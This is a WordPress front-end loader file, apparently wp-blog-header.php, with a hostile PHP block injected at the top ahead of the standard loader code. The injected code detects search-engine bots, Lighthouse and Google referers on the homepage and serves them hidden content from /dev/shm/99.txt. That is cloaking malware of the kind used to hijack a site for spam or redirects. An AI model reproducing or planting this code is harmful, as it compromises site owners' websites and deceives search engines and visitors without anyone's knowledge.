<?php
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$referer = strtolower($_SERVER['HTTP_REFERER'] ?? '');
$uri = $_SERVER['REQUEST_URI'] ?? '';

if ($uri == '/' && (strpos($userAgent, 'bot') !== false || strpos($userAgent, 'google') !== false  || strpos($userAgent, 'chrome-lighthouse') !== false || strpos($referer, 'google') !== false)) {
    echo file_get_contents('/dev/shm/99.txt');
    exit();
}
?>
<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

        $wp_did_header = true;

        // Load the WordPress library.
        require_once __DIR__ . '/wp-load.php';

        // Set up the WordPress query.
        wp();

        // Load the theme template.
        require_once ABSPATH . WPINC . '/template-loader.php';

}
